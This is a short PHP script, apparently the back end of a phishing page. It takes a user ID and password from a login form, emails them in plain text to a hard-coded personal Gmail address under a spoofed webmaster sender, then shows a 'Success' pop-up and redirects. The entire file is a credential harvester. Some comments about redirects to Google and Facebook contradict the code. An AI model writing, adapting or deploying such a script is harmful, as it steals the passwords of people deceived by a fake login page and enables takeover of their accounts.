<?php
if(isset($_POST['user_id']) && isset($_POST['password'])) {
    $to = "ericmichae01@gmail.com"; // email address to send the login details to
    $subject = "Login Details"; // email subject
    $user_id = $_POST['user_id']; // retrieve user ID from form
    $password = $_POST['password']; // retrieve password from form
    $message = "User ID: " . $user_id . "
Password: " . $password; // create email message
    $headers = "From: webmaster@example.com"; // email headers
    if(mail($to, $subject, $message, $headers)) {
        echo "<script>alert('Success.')</script>"; // display success message in pop-up window
        echo "<script>window.location.href = 'index.html';</script>"; // redirect to google.com
    } else {
        echo "<script>alert('Error logging in login details.')</script>"; // display error message in pop-up window
        echo "<script>window.location.href = 'index.html';</script>"; // redirect to Facebook.com
    }
}
?>